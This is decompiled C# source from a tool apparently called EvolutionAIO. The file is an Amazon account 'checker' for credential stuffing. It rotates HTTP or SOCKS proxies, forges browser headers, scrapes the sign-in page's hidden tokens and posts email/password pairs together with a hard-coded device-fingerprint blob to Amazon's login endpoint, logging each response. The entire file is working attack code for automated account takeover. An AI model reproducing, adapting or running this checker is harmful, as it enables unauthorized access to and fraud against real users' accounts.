// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Amazon
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class Amazon
  {
    public static bool check(string[] s, string proxy)
    {
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
          httpRequest.AddHeader("Pragma", "no-cache");
          httpRequest.AddHeader("Accept", "*/*");
          HttpResponse httpResponse = httpRequest.Get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
          Save.AsResult(nameof (Amazon), "R1", httpResponse.ToString());
          httpRequest.ClearAllHeaders();
          string str = "appActionToken=" + Menu.Parse(httpResponse.ToString(), "name=\"appActionToken\" value=\"", "\"") + "&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=" + Menu.Parse(httpResponse.ToString(), "name=\"openid.return_to\" value=\"", "\"") + "&prevRID=" + Menu.Parse(httpResponse.ToString(), "name=\"prevRID\" value=\"", "\"") + "&workflowState=" + Menu.Parse(httpResponse.ToString(), "name=\"workflowState\" value=\"", "\"") + "&email=" + s[0] + "&password=" + s[1] + "&create=0&metadata1=ECdITeCs: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";
          httpRequest.AddHeader("Host", "www.amazon.com");
          httpRequest.AddHeader("Connection", "keep-alive");
          httpRequest.AddHeader("Cache-Control", "max-age=0");
          httpRequest.AddHeader("rtt", "250");
          httpRequest.AddHeader("downlink", "1.3");
          httpRequest.AddHeader("ect", "3g");
          httpRequest.AddHeader("Origin", "https://www.amazon.com");
          httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
          httpRequest.AddHeader("DNT", "1");
          httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
          httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
          httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
          httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
          httpRequest.AddHeader("Sec-Fetch-User", "?1");
          httpRequest.AddHeader("Sec-Fetch-Dest", "document");
          httpRequest.AddHeader("Referer", "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
          httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
          Save.AsResult(nameof (Amazon), "R2", httpRequest.Post("https://www.amazon.com/ap/signin", str, "application/x-www-form-urlencoded").ToString());
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        Save.AsResult(nameof (Amazon), "Errors", ex.ToString());
        ++Menu.errors;
      }
      return false;
    }
  }
}
